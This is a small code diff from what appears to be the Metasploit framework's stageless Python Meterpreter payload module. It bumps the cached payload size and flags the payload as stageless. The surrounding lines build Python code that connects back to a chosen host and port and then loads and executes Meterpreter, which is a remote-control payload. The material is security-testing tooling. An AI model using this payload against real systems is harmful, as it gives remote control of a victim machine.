@@ -11,7 +11,7 @@ require 'msf/base/sessions/meterpreter_python'
 
 module MetasploitModule
 
-  CachedSize = 53302
+  CachedSize = 54058
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -35,6 +35,7 @@ module MetasploitModule
     socket_setup  = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
     socket_setup << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
+    opts[:stageless] = true
 
     met = stage_meterpreter(opts)
     py_create_exec_stub(met)
